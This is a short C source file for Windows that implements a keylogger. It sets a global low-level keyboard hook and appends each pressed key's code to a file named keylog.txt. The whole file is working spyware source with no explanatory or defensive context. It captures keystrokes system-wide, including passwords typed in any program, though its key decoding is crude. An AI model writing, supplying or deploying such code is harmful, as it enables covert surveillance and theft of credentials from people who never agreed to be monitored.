#include <windows.h>
#include <stdio.h>

// Function prototypes
LRESULT CALLBACK KeyboardProc(int code, WPARAM wParam, LPARAM lParam);

FILE *logFile; // File pointer for logging

int main() {
    logFile = fopen("keylog.txt", "a"); // Open log file in append mode
    if (!logFile) {
        printf("Failed to open log file\n");
        return 1;
    }

    // Set up keyboard hook
    HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    if (!hook) {
        printf("Failed to set hook\n");
        return 1;
    }

    // Message loop to keep the hook active
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // Cleanup
    UnhookWindowsHookEx(hook);
    fclose(logFile); // Close the log file
    return 0;
}

// Keyboard procedure to handle key events
LRESULT CALLBACK KeyboardProc(int code, WPARAM wParam, LPARAM lParam) {
    if (code == HC_ACTION) {
        // Check if a key is pressed
        if (wParam == WM_KEYDOWN) {
            DWORD vkCode = ((KBDLLHOOKSTRUCT*)lParam)->vkCode; // Get virtual key code
            fprintf(logFile, "%c ", (char)vkCode); // Log the key code
            fflush(logFile); // Flush the output buffer
        }
    }
    return CallNextHookEx(NULL, code, wParam, lParam); // Call the next hook
}